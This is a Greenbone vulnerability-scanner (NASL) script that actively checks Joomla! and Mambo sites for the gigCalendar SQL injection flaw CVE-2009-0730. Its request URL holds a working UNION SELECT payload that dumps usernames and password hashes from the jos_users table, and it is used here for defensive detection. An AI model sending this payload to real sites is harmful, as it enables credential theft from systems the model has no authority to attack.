# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100004");
  script_version("2024-10-23T05:05:59+0000");
  script_tag(name:"last_modification", value:"2024-10-23 05:05:59 +0000 (Wed, 23 Oct 2024)");
  script_tag(name:"creation_date", value:"2009-02-26 04:52:45 +0100 (Thu, 26 Feb 2009)");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-0730");
  script_name("Joomla! and Mambo gigCalendar Component SQLi Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"summary", value:"The gigCalendar component for Joomla! and Mambo is prone to an
  SQL injection (SQLi) vulnerability because it fails to sufficiently sanitize user-supplied data
  before using it in an SQL query.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow the attacker to view username
  and password of a registered user.

  Exploiting this issue could allow an attacker to compromise the application, access or modify
  data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"gigCalendar 1.0 is vulnerable, other versions may also be
  affected.");

  script_tag(name:"solution", value:"- Update to a newer version if available

  - Remove the gigCalendar component");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33859");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/33863");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?option=com_gigcal&task=details&gigcal_bands_id=-1%27UNION%20ALL%20SELECT%201,2,3,4,5," +
            "concat(%27username:%20%27,username),concat(%27password:%20%27,%20password),NULL,NULL,NULL,NULL,NULL," +
            "NULL%20FROM%20jos_users%23";

if (http_vuln_check(port: port, url: url, pattern: "password:.[a-f0-9]{32}:")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
